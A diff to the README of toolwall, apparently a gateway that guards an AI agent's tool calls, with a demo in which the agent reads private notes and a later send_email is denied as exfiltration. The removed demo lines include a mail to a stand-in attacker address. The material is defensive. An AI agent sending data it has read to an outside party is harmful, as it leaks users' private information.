@@ -14,18 +14,29 @@ names the earlier call that caused it.
 [![CI](https://github.com/YusufDrymz/toolwall/actions/workflows/ci.yml/badge.svg)](https://github.com/YusufDrymz/toolwall/actions)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
+Three calls go through the gateway. Send a status mail: fine. Read the private notes:
+fine. Send a mail again, now that the notes are in the session:
+
 ```
-$ toolwall run --server demo
+$ toolwall run --server demo --audit audit.jsonl
 toolwall: fronting "demo" in enforce mode
-
-  → tools/call send_email  {"to":"ops@example.com"}          ok
-  → tools/call read_notes  {}                                ok
-  → tools/call send_email  {"to":"attacker@evil.test"}        DENIED
-
 toolwall: denied send_email (exfiltration)
+
+$ toolwall audit --file audit.jsonl
+16:58:26 call       send_email(body, to)
+16:58:26 call       read_notes()
+16:58:26 DENIED     send_email
+           rule exfiltration: sensitive data was read earlier in this scope
+           because call 2 (read_notes) brought sensitive data in
+16:58:26 result     send_email
+16:58:26 result     read_notes
+
+call         2
+result       2
+denied       1
 ```
 
-The client gets a real JSON-RPC error, written for the model that will read it:
+The client gets a real JSON-RPC error back, written for the model that will read it:
 
 ```
 toolwall denied this call to "send_email": sensitive data was read earlier in this
@@ -57,7 +68,8 @@ this particular session already read.
 go install github.com/YusufDrymz/toolwall/cmd/toolwall@latest
 ```
 
-Requires Go 1.24+. Builds with `CGO_ENABLED=0`, no dependencies at runtime.
+Requires Go 1.24+. Builds with `CGO_ENABLED=0`; the only non-test dependency is
+`gopkg.in/yaml.v3`.
 
 ## Quickstart
 
